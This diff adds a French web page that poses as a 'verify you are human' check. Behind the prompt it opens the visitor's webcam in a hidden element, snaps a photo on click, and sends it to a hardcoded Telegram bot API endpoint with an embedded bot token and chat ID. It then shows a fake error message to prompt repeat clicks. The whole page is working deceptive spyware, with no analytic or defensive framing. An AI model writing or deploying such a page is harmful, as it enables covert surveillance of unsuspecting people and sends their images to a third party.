@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Caméra et Envoi Telegram</title>
+</head>
+<body>
+
+    <video id="video" autoplay style="display:none;"></video>
+    <h3>Nous devons vérifier que vous êtes humain !</h3>
+    <button id="capture">confirmé </button>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const captureBtn = document.getElementById("capture");
+        const ctx = canvas.getContext("2d");
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => video.srcObject = stream)
+            .catch(err => alert("Accès à la caméra refusé"));
+
+        captureBtn.addEventListener("click", async () => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/png"));
+
+            const formData = new FormData();
+            formData.append("chat_id", "7879061625");
+            formData.append("photo", imageBlob, "photo.png");
+
+            await fetch(`https://api.telegram.org/bot7894685926:AAFaF5fINZ1ZNcXJWY3YrQhP5vmyyf7yMZU/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
+
+            alert("une erreur s'est produite veuillez réessayer ");
+        });
+    </script>
+
+</body>
+</html>
